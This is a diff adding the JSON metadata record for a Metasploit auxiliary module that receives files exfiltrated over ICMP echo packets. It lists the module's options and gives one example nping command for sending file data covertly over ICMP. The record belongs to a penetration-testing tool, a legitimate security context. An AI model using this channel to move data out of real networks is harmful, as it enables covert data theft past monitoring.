@@ -1,0 +1,181 @@
+{
+  "name": "ICMP Exfiltration Service",
+  "fullname": "auxiliary/server/icmp_exfil",
+  "aliases": [
+
+  ],
+  "rank": 300,
+  "disclosure_date": null,
+  "type": "auxiliary",
+  "author": [
+    "Chris John Riley"
+  ],
+  "description": "This module is designed to provide a server-side component to receive and store files\n        exfiltrated over ICMP echo request packets.\n\n        To use this module you will need to send an initial ICMP echo request containing the\n        specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or\n        a random filename can be assigned). All data received from this source will automatically\n        be added to the receive buffer until an ICMP echo request containing a specific end trigger\n        (defaults to '^EOL') is received.\n\n        Suggested Client:\n        Data can be sent from the client using a variety of tools. One such example is nping (included\n        with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string \"BOFtest.txt\" -c1",
+  "references": [
+    "https://github.com/todb/packetfu",
+    "http://nmap.org/book/nping-man.html",
+    "http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/"
+  ],
+  "platform": "",
+  "arch": "",
+  "autofilter_ports": [
+
+  ],
+  "autofilter_services": [
+
+  ],
+  "targets": null,
+  "path": "/modules/auxiliary/server/icmp_exfil.rb",
+  "ref_name": "server/icmp_exfil",
+  "check": false,
+  "post_auth": false,
+  "default_credential": false,
+  "notes": {
+  },
+  "needs_cleanup": null,
+  "options": [
+    {
+      "type": "string",
+      "name": "WORKSPACE",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": true,
+      "description": "Specify the workspace for this module"
+    },
+    {
+      "type": "bool",
+      "name": "VERBOSE",
+      "required": false,
+      "default": false,
+      "aliases": [
+
+      ],
+      "advanced": true,
+      "description": "Enable detailed status messages"
+    },
+    {
+      "type": "string",
+      "name": "INTERFACE",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The name of the interface"
+    },
+    {
+      "type": "string",
+      "name": "START_TRIGGER",
+      "required": true,
+      "default": "^BOF",
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "Trigger for beginning of file"
+    },
+    {
+      "type": "string",
+      "name": "END_TRIGGER",
+      "required": true,
+      "default": "^EOF",
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "Trigger for end of file"
+    },
+    {
+      "type": "string",
+      "name": "RESP_START",
+      "required": true,
+      "default": "SEND",
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "Data to respond when initial trigger matches"
+    },
+    {
+      "type": "string",
+      "name": "RESP_CONT",
+      "required": true,
+      "default": "OK",
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "Data ro resond when continuation of data expected"
+    },
+    {
+      "type": "string",
+      "name": "RESP_END",
+      "required": true,
+      "default": "COMPLETE",
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "Data to response when EOF received and data saved"
+    },
+    {
+      "type": "string",
+      "name": "BPF_FILTER",
+      "required": true,
+      "default": "icmp",
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "BFP format filter to listen for"
+    },
+    {
+      "type": "bool",
+      "name": "FNAME_IN_PACKET",
+      "required": true,
+      "default": true,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "Filename presented in first packet straight after START_TRIGGER"
+    },
+    {
+      "type": "enum",
+      "name": "CLOAK",
+      "required": true,
+      "default": "linux",
+      "aliases": [
+
+      ],
+      "advanced": true,
+      "description": "OS fingerprint to use for packet creation (Accepted: windows, linux, freebsd)"
+    },
+    {
+      "type": "bool",
+      "name": "PROMISC",
+      "required": true,
+      "default": false,
+      "aliases": [
+
+      ],
+      "advanced": true,
+      "description": "Enable/Disable promiscuous mode"
+    },
+    {
+      "type": "address",
+      "name": "LOCALIP",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": true,
+      "description": "The IP address of the local interface"
+    }
+  ]
+}
